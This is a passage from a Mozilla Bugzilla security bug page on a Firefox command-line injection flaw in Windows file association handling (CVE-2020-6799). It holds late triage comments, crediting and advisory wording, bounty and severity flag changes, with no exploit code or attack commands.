</div></div><div class="change-set" id="c41"><div class="comment" data-id="14606539" data-no="41"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-41" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a1322679_458188"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-41"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-41" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c41">Comment 41</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-22 15:40 PST" data-time="1579736412">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-41">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-41" data-comment-id="14606539" data-ismarkdown="true" ><p>I was wrong about Chrome, it has not been patched and I have opened a bug report with their team.</p>
</div></div><div class="change-set" id="c42"><div class="comment" data-id="14606547" data-no="42"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-42" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a1322679_458188"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-42"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-42" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c42">Comment 42</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-22 15:44 PST" data-time="1579736685">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-42">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-42" data-comment-id="14606547" data-ismarkdown="true" ><p>I see, thanks for doing that and reporting back.</p>
</div></div><div class="change-set" id="a1841922_578488"><div class="change" id="aa1841922_578488">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a1841922_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_578488" id="a1841922_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1841922_578488"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1841922_578488">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a1841922_578488">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-23 07:33 PST" data-time="1579793605">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage] &rarr; [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+]</div></div></div><div class="change-set" id="a1842090_578488"><div class="change" id="aa1842090_578488">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a1842090_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_578488" id="a1842090_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1842090_578488"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1842090_578488">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a1842090_578488">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-23 07:36 PST" data-time="1579793773">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] &rarr; [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+]</div></div></div><div class="change-set" id="c43"><div class="comment" data-id="14607775" data-no="43"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-43" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a1842090_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_578488" id="a1842090_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-43"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-43" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c43">Comment 43</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-23 07:54 PST" data-time="1579794874">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-43">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9122670"
         class="attachment obsolete"
         data-id="9122670" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="file_1606596.txt">
      <meta itemprop="contentSize" content="453">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9122670" itemprop="contentUrl">
        <span id="att-9122670-description" itemprop="description">advisory.txt</span></a> (obsolete)
        — <a href="attachment.cgi?id=9122670&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c44"><div class="comment" data-id="14608770" data-no="44"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-44" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a1842090_578488"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a1842090_578488"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-44"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-44" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c44">Comment 44</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-23 15:28 PST" data-time="1579822095">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-44">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-44" data-comment-id="14608770" data-ismarkdown="true" ><p>Hi @Tom.<br>
Could you please use Joshua Graham &amp; Brendan Scarvell for credit?</p>
<p>This advisory text might be a little more technically accurate if you would like to use it instead (modified from the previous advisory <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2019-08/#CVE-2019-9794" rel="nofollow">https://www.mozilla.org/en-US/security/advisories/mfsa2019-08/#CVE-2019-9794</a>):</p>
<p>A vulnerability was discovered where command line arguments can be injected during Firefox invocation as a shell handler for certain unsupported file types. This could be used to retrieve and execute files whose location is supplied through these command line arguments if Firefox is configured as the default handler for a given file type and the file is opened in third party application as these applications insufficiently sanitize URL data.&lt;br&gt;<em>Note: This issue only affects Windows operating systems. Other operating systems are unaffected.</em><br>
Joshua Graham &amp; Brendan Scarvell</p>
</div></div><div class="change-set" id="c45"><div class="comment" data-id="14609569" data-no="45"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-45" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a1842090_578488"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a1842090_578488"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-45"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-45" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c45">Comment 45</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-24 05:58 PST" data-time="1579874286">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-45">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-45" data-comment-id="14609569" data-ismarkdown="true" ><p>see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c44" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment 44</a>.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(tom)</div></div></div><div class="change-set" id="c46"><div class="comment" data-id="14609677" data-no="46"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-46" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a1842090_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_578488" id="a1842090_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-46"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-46" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c46">Comment 46</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-24 07:03 PST" data-time="1579878194">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-46">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9122901"
         class="attachment"
         data-id="9122901" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="file_1606596.txt">
      <meta itemprop="contentSize" content="786">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9122901" itemprop="contentUrl">
        <span id="att-9122901-description" itemprop="description">advisory.txt</span></a>
        — <a href="attachment.cgi?id=9122901&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-46" data-comment-id="14609677" data-ismarkdown="true" ><p>Thanks!</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9122670&amp;action=edit"
           title="advisory.txt"
           class=""
        >Attachment #9122670</a> -
        Attachment is obsolete: true</div><div class="change">Flags: <span class="activity-deleted">needinfo?(tom)</span></div></div></div><div class="change-set" id="a2802280_1689"><div class="change" id="aa2802280_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a2802280_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a2802280_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2802280_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2802280_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a2802280_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-02-03 10:19 PST" data-time="1580753963">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: sec-bounty? &rarr; sec-bounty+</div><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a> &rarr; <a href="/buglist.cgi?keywords=sec-moderate&amp;resolution=---">sec-moderate</a></div></div></div><div class="change-set" id="a3397298_578488"><div class="change" id="aa3397298_578488">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a3397298_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_578488" id="a3397298_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a3397298_578488"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3397298_578488">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a3397298_578488">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-02-10 07:36 PST" data-time="1581348981">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2020-6799</div></div></div><div class="change-set" id="a6008891_159069"><div class="change" id="aa6008891_159069">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a6008891_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a6008891_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a6008891_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a6008891_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a6008891_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-11 14:02 PDT" data-time="1583960574">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Regressions: <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Firefox don't listed in context menu &quot;open with...&quot; with file type .jpg extension"
   href="/show_bug.cgi?id=1619122">1619122</a></div></div></div><div class="change-set" id="a13390813_1689"><div class="change" id="aa13390813_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a13390813_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a13390813_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a13390813_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a13390813_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a13390813_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-06-05 00:34 PDT" data-time="1591342496">1 year ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1606596&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>